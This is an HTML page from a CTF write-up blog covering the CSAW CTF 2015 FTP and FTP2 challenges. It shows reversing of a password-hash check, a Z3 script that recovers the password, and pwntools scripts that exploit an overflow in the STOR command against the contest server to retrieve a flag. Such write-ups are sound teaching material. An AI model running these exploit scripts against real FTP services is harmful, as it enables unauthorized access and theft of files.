@@ -1,0 +1,831 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.13.0 by Michael Rose
+  Copyright 2013-2018 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE.txt
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>CSAW CTF 2015 – FTP &amp; FTP2 - Hacking Tube 2.0</title>
+<meta name="description" content="Category: Reversing (FTP) &amp; Exploitable (FTP2)Points: 300 (FTP) &amp; 300 (FTP2)">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Hacking Tube 2.0">
+<meta property="og:title" content="CSAW CTF 2015 – FTP &amp; FTP2">
+<meta property="og:url" content="http://0.0.0.0:4000/csaw-ctf-2015-ftp/">
+
+
+  <meta property="og:description" content="Category: Reversing (FTP) &amp; Exploitable (FTP2)Points: 300 (FTP) &amp; 300 (FTP2)">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2015-09-22T10:10:00+08:00">
+
+
+
+
+
+
+<link rel="canonical" href="http://0.0.0.0:4000/csaw-ctf-2015-ftp/">
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Hacking Tube 2.0 Feed">
+
+<!-- http://t.co/dKP3o1e -->
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if lte IE 9]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    <div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        <a class="site-title" href="/">Hacking Tube 2.0</a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/about" >About</a>
+            </li><li class="masthead__menu-item">
+              <a href="/archives/" >Archive</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle Menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="http://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/other/gravatar.png" alt="Bruce Chen" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Bruce Chen</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Vulnerability researcher / CTFer
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="http://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Taiwan</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="https://twitter.com/bruce30262"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
+          
+        
+          
+            <li><a href="https://github.com/bruce30262"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="http://schema.org/CreativeWork">
+    <meta itemprop="headline" content="CSAW CTF 2015 – FTP &amp; FTP2">
+    <meta itemprop="description" content="Category: Reversing (FTP) &amp; Exploitable (FTP2)Points: 300 (FTP) &amp; 300 (FTP2)">
+    <meta itemprop="datePublished" content="September 22, 2015">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">CSAW CTF 2015 – FTP &amp; FTP2
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p><strong>Category:</strong> Reversing (FTP) &amp; Exploitable (FTP2)
+<strong>Points:</strong> 300 (FTP) &amp; 300 (FTP2)</p>
+
+<!-- more -->
+
+<h1 id="ftp">FTP</h1>
+<p><a href="https://github.com/ctfs/write-ups-2015/blob/master/csaw-ctf-2015/reverse/ftp-300/ftp_0319deb1c1c033af28613c57da686aa7">64 bit ELF</a>. It’s a FTP-like service, we can list all the acceptable command by sending the <code class="highlighter-rouge">HELP</code> command. Here are some important commands that we’ll need to pass the challenges:<br />
+<code class="highlighter-rouge">USER [username]</code>: enter username to login
+<code class="highlighter-rouge">PASS [password]</code>: enter password after sending the <code class="highlighter-rouge">USER</code> command to login as the <code class="highlighter-rouge">[username]</code>
+<code class="highlighter-rouge">PASV</code>: open a port for passive mode
+<code class="highlighter-rouge">LIST</code>: list the files in the directory
+<code class="highlighter-rouge">STOR</code>: upload a file
+<code class="highlighter-rouge">RETR</code>: download a file
+<code class="highlighter-rouge">RDF</code>: read the reversing solution’s flag</p>
+
+<p>So after some static analysis with the help of IDA Pro, I figure out that in order to pass the reversing challenge, we’ll need to login as the user <code class="highlighter-rouge">blankwall</code>. The password checking function’s at <code class="highlighter-rouge">0x401540</code>, let’s take a look at it:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">__int64</span> <span class="kr">__fastcall</span> <span class="nf">sub_401540</span><span class="p">(</span><span class="n">__int64</span> <span class="n">a1</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [sp+10h] [bp-8h]@1
+</span>    <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [sp+14h] [bp-4h]@1
+</span>
+    <span class="n">v3</span> <span class="o">=</span> <span class="mi">5381</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">i</span> <span class="o">+</span> <span class="n">a1</span><span class="p">);</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+        <span class="n">v3</span> <span class="o">=</span> <span class="mi">33</span> <span class="o">*</span> <span class="n">v3</span> <span class="o">+</span> <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">i</span> <span class="o">+</span> <span class="n">a1</span><span class="p">);</span>
+    <span class="k">return</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">v3</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="n">result</span> <span class="o">==</span> <span class="o">-</span><span class="mi">746139127</span><span class="p">)</span> <span class="c1">// result should be 0xd386d209
+</span><span class="p">{</span>
+    <span class="n">login_bit</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="n">dword_604408</span> <span class="o">=</span> <span class="sc">'f'</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>At first I was like “Ah, that’s easy!”, since we have the constraint system, we can just set it up and leave the rest to Z3. But after I have the solution and enter the password, the service respond it with a frustrating <strong>“Invalid login credentials”</strong>. Knowing that Hex-Rays’ decompiler might have the incorrect decompiling result, I re-check the password checking logic by reversing directly from the x64 assembly, not the pseudo code, and finally found the root of the problem:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mov     eax, [rbp+var_4] ; v3, with 0x1505 as the initial value
+shl     eax, 5
+mov     edx, eax         ; rdx = (v3 &lt;&lt; 5) &amp; 0xFFFFFFFF
+mov     eax, [rbp+var_4] ; now rax = ((v3 &lt;&lt; 5) &amp; 0xFFFFFFFF00000000) | (v3 &amp; 0xFFFFFFFF)
+lea     ecx, [rdx+rax]   ; ecx = (rdx + rax) &amp; 0xFFFFFFFF
+mov     eax, [rbp+var_8] ; for loop counter == index
+movsxd  rdx, eax
+mov     rax, [rbp+var_18]
+add     rax, rdx
+movzx   eax, byte ptr [rax]
+movsx   eax, al ; eax = password[index]
+add     eax, ecx ; 
+mov     [rbp+var_4], eax ; v3 = ecx + eax
+</code></pre></div></div>
+
+<p>What really matters is the assembly <code class="highlighter-rouge">eax, [rbp+var_4]</code> at line 4. Notice that when the program move <code class="highlighter-rouge">v3</code> to the register <code class="highlighter-rouge">eax</code>, <strong>it doesn’t clear the highest 32 bits of the register <code class="highlighter-rouge">rax</code></strong>. So when it runs to the line <code class="highlighter-rouge">ecx, [rdx+rax]</code>, <code class="highlighter-rouge">rax</code> isn’t just simply <code class="highlighter-rouge">v3 &amp; 0xFFFFFFFF</code>, it’s actually:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>((v3 &lt;&lt; 5) &amp; 0xFFFFFFFF00000000) | (v3 &amp; 0xFFFFFFFF)
+</code></pre></div></div>
+<p>and that’s where the Hex-Rays decompiler made the mistake.</p>
+
+<p>So now we have the correct constraint system. Wrote a Z3 python script and retrieve the password:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
+
+<span class="kn">from</span> <span class="nn">z3</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="k">def</span> <span class="nf">check</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">xs</span><span class="p">):</span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="n">BitVecVal</span><span class="p">(</span><span class="mh">0x1505</span><span class="p">,</span> <span class="mi">64</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
+        <span class="n">eax</span> <span class="o">=</span> <span class="n">ret</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span>
+        <span class="n">eax</span> <span class="o">&lt;&lt;=</span> <span class="mi">5</span>
+        <span class="n">rdx</span> <span class="o">=</span> <span class="n">eax</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span>
+        <span class="n">rax</span> <span class="o">=</span> <span class="p">(</span><span class="mh">0xffffffff00000000</span> <span class="o">&amp;</span> <span class="n">eax</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span>
+        <span class="n">ecx</span> <span class="o">=</span> <span class="p">(</span><span class="n">rdx</span> <span class="o">+</span> <span class="n">rax</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span>
+        <span class="n">ecx</span> <span class="o">+=</span> <span class="n">xs</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
+        <span class="n">ret</span> <span class="o">=</span> <span class="n">ecx</span>
+    <span class="k">return</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">solv</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">target</span><span class="p">):</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="n">Solver</span><span class="p">()</span>
+    <span class="n">xs</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
+        <span class="n">x</span> <span class="o">=</span> <span class="n">BitVec</span><span class="p">(</span><span class="s">"x</span><span class="si">%</span><span class="s">d"</span> <span class="o">%</span> <span class="n">i</span><span class="p">,</span> <span class="mi">64</span><span class="p">)</span>
+        <span class="n">s</span><span class="o">.</span><span class="n">add</span><span class="p">(</span> <span class="mi">33</span> <span class="o">&lt;=</span> <span class="n">x</span> <span class="p">)</span>
+        <span class="n">s</span><span class="o">.</span><span class="n">add</span><span class="p">(</span> <span class="n">x</span> <span class="o">&lt;=</span> <span class="mi">122</span> <span class="p">)</span>
+        <span class="n">xs</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+
+    <span class="n">s</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">check</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">xs</span><span class="p">)</span> <span class="o">==</span> <span class="n">target</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">s</span><span class="o">.</span><span class="n">check</span><span class="p">()</span> <span class="o">==</span> <span class="n">sat</span><span class="p">:</span>
+        <span class="n">m</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">model</span><span class="p">()</span>
+        <span class="n">a</span> <span class="o">=</span> <span class="s">""</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
+            <span class="k">print</span> <span class="n">m</span><span class="p">[</span><span class="n">xs</span><span class="p">[</span><span class="n">i</span><span class="p">]]</span>        
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">print</span> <span class="s">"unsat"</span>
+
+<span class="k">for</span> <span class="n">size</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">11</span><span class="p">):</span>
+    <span class="k">print</span> <span class="s">"trying size:"</span><span class="p">,</span> <span class="n">size</span>
+    <span class="n">solv</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="mh">0xd386d209</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Since I don’t know the password length, I just brute force it from 1 ~ 10. We can found a solution at length 6:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>trying size: 0
+unsat
+trying size: 1
+unsat
+trying size: 2
+unsat
+trying size: 3
+unsat
+trying size: 4
+unsat
+trying size: 5
+unsat
+trying size: 6
+86
+41
+66
+119
+116
+88
+</code></pre></div></div>
+
+<p>Now we get the login password, time to capture the flag :)</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
+
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">time</span>
+
+<span class="c">#HOST = "localhost"</span>
+<span class="n">HOST</span> <span class="o">=</span> <span class="s">"54.175.183.202"</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">12012</span>
+<span class="n">ELF_PATH</span> <span class="o">=</span> <span class="s">""</span>
+<span class="n">LIBC_PATH</span> <span class="o">=</span> <span class="s">""</span>
+
+<span class="c"># setting </span>
+<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+<span class="c">#context.arch = 'i386'</span>
+<span class="c">#context.arch = 'arm'</span>
+<span class="c">#context.arch = 'aarch64'</span>
+<span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
+<span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s">'little'</span>
+<span class="n">context</span><span class="o">.</span><span class="n">word_size</span> <span class="o">=</span> <span class="mi">32</span>
+<span class="c">#elf = ELF(ELF_PATH)</span>
+<span class="c">#libc = ELF(LIBC_PATH)</span>
+
+<span class="k">def</span> <span class="nf">my_recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">delim</span><span class="p">):</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="s">""</span>
+    <span class="k">while</span> <span class="n">delim</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">res</span><span class="p">:</span>
+        <span class="n">c</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+        <span class="n">res</span> <span class="o">+=</span> <span class="n">c</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">res</span>
+
+<span class="k">def</span> <span class="nf">myexec</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+
+    <span class="n">password</span> <span class="o">=</span> <span class="p">[</span><span class="mi">86</span><span class="p">,</span> <span class="mi">41</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">88</span><span class="p">]</span>
+    <span class="n">password</span> <span class="o">=</span> <span class="s">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">password</span><span class="p">)</span>
+
+    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
+    <span class="c">#r = process(ELF_PATH)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"server</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"USER blankwall"</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"blankwall</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"PASS "</span><span class="o">+</span><span class="n">password</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"in</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"RDF"</span><span class="p">)</span> <span class="c"># read the flag</span>
+
+    <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>The flag is: <code class="highlighter-rouge">flag{n0_c0ok1e_ju$t_a_f1ag_f0r_you}</code></p>
+
+<h1 id="ftp2">FTP2</h1>
+<p>So now we’re logged in as a valid user, we can finally do some other stuff. After sending <code class="highlighter-rouge">PASV</code> and the <code class="highlighter-rouge">LIST</code> command, I found that there’s a <code class="highlighter-rouge">flag.txt</code> in the directory. At first I try to download the file, but the service response <strong>“Invalid character specified”</strong>. Well that’s strange :/ so I went to the <code class="highlighter-rouge">RETR</code> function and start analyzing.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">s</span> <span class="o">=</span> <span class="n">filename</span><span class="p">;</span> <span class="c1">//[bp - 0x30]
+</span><span class="n">v7</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">filename</span><span class="p">);</span> <span class="c1">//[bp - 0x28]
+</span><span class="k">while</span> <span class="p">(</span> <span class="o">*</span><span class="n">s</span> <span class="o">!=</span> <span class="n">dword_604408</span> <span class="p">)</span>
+<span class="p">{</span>
+    <span class="o">--</span><span class="n">v7</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v7</span> <span class="p">)</span>
+        <span class="k">break</span><span class="p">;</span>
+    <span class="o">++</span><span class="n">s</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="k">if</span> <span class="p">(</span> <span class="n">s</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">sub_4014F8</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">a1</span><span class="p">,</span> <span class="s">"Invalid character specified</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>So…to sum it up, the program will detect whether if the filename has the character store in <code class="highlighter-rouge">0x604408</code>, and if it does, it will refuse to let us download the file. Remeber the function that does the password checking?</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="n">result</span> <span class="o">==</span> <span class="o">-</span><span class="mi">746139127</span><span class="p">)</span> <span class="c1">// result should be 0xd386d209
+</span><span class="p">{</span>
+    <span class="n">login_bit</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="n">dword_604408</span> <span class="o">=</span> <span class="sc">'f'</span><span class="p">;</span> <span class="c1">//LOL
+</span><span class="p">}</span>
+</code></pre></div></div>
+<p>So apparently we can’t have <code class="highlighter-rouge">'f'</code> in our filename, we’ll need to find another way to bypass the filter. By checking other functions, I finally found a way to bypass it.</p>
+
+<p>```c STOR function
+sub_4014F8(<em>(_DWORD *)a1, “transfer starting.\n”);
+while ( 1 )
+{
+    v6 = recv(</em>(_DWORD *)(a1 + 4), byte_604200, 0xAuLL, 0);
+    if ( v6 &lt; 0 )
+        break;
+    if ( !v6 )
+        goto LABEL_8;
+    v5 += v6;
+}</p>
+
+<p>sub_4014F8(*(_DWORD *)a1, “error receiving file”);</p>
+
+<p>LABEL_8:
+    printf(“Storing file %s”, <em>(_QWORD *)(a1 + 24));
+    byte_604200[(signed __int64)(signed int)v5] = 0; // overflow vulnerability
+    v3 = dword_604404++;
+    LODWORD(v4) = sub_40139B(v7, v5);
+    qword_604840[v3] = v4;
+    sub_4014F8(</em>(_DWORD *)a1, “transfer complete\n”);
+    result = sub_4023DF(a1, 4207204LL);</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+Here in the `STOR` function, **if we upload a file that is big enough, we can overwrite the data at `0x604408`**. So it's quite simple: just create a file that is larger than 512 bytes, then upload it to the server. After that, we can download the `flag.txt` and get the flag.
+
+```python
+#!/usr/bin/env python
+
+from pwn import *
+import subprocess
+import sys
+import time
+
+#HOST = "localhost"
+HOST = "54.175.183.202"
+PORT = 12012
+ELF_PATH = ""
+LIBC_PATH = ""
+
+# setting 
+context.arch = 'amd64'
+#context.arch = 'i386'
+#context.arch = 'arm'
+#context.arch = 'aarch64'
+context.os = 'linux'
+context.endian = 'little'
+context.word_size = 32
+#elf = ELF(ELF_PATH)
+#libc = ELF(LIBC_PATH)
+
+def my_recvuntil(s, delim):
+    res = ""
+    while delim not in res:
+        c = s.recv(1)
+        res += c
+        sys.stdout.write(c)
+        sys.stdout.flush()
+    return res
+
+def myexec(cmd):
+    return subprocess.check_output(cmd, shell=True)
+
+if __name__ == "__main__":
+
+    """
+    solved by z3
+    trying size: 6
+    86
+    41
+    66
+    119
+    116
+    88
+    """
+    password = [86, 41, 66, 119, 116, 88]
+    password = ''.join(chr(c) for c in password)
+
+    r = remote(HOST, PORT)
+    #r = process(ELF_PATH)
+    r.sendlineafter("server\n", "USER blankwall")
+    r.sendafter("blankwall\n", "PASS "+password)
+    r.recvuntil("in\n")
+    log.success("login success")
+
+    log.info("Sending dildo.txt...") # don't mind the filename LOL!
+    r.sendlinethen("port: ", "PASV")
+    pasv_port = int(r.recvline())
+    r.sendline("STOR dildo.txt")
+    myexec("cat dildo.txt | nc "+HOST+" "+str(pasv_port))
+    r.recvuntil("complete\n")
+    log.success("Send success!")
+
+    log.info("Downloading flag.txt...")
+    r.sendlinethen("port: ", "PASV")
+    pasv_port = int(r.recvline())
+    r.sendline("RETR flag.txt")
+    flag = myexec("nc "+HOST+" "+str(pasv_port))
+    log.success("Get flag: "+flag)
+</code></pre></div></div>
+
+<p>The flag is: <code class="highlighter-rouge">flag{exploiting_ftp_servers_in_2015}</code></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#csaw" class="page__taxonomy-item" rel="tag">CSAW</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#ctf" class="page__taxonomy-item" rel="tag">CTF</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#pwnable" class="page__taxonomy-item" rel="tag">Pwnable</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#python" class="page__taxonomy-item" rel="tag">Python</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#reversing" class="page__taxonomy-item" rel="tag">Reversing</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#z3" class="page__taxonomy-item" rel="tag">Z3</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#write-ups" class="page__taxonomy-item" rel="tag">write-ups</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2015-09-22T10:10:00+08:00">September 22, 2015</time></p>
+        
+      </footer>
+
+      <!-- /usr/gem/gems/minimal-mistakes-jekyll-4.13.0/_includes/social-share.html -->
+<!-- Remove linkdin shared button -->
+<section class="page__share">
+  
+
+  <a href="https://twitter.com/intent/tweet?text=CSAW+CTF+2015+--+FTP+%26+FTP2%20http%3A%2F%2F0.0.0.0%3A4000%2Fcsaw-ctf-2015-ftp%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2F0.0.0.0%3A4000%2Fcsaw-ctf-2015-ftp%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://plus.google.com/share?url=http%3A%2F%2F0.0.0.0%3A4000%2Fcsaw-ctf-2015-ftp%2F" class="btn btn--google-plus" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Google Plus"><i class="fab fa-fw fa-google-plus" aria-hidden="true"></i><span> Google+</span></a>
+
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/csaw-ctf-2015-hacking-time/" class="pagination--pager" title="CSAW CTF 2015 – Hacking Time
+">Previous</a>
+    
+    
+      <a href="/csaw-ctf-2015-wyvern/" class="pagination--pager" title="CSAW CTF 2015 – wyvern
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
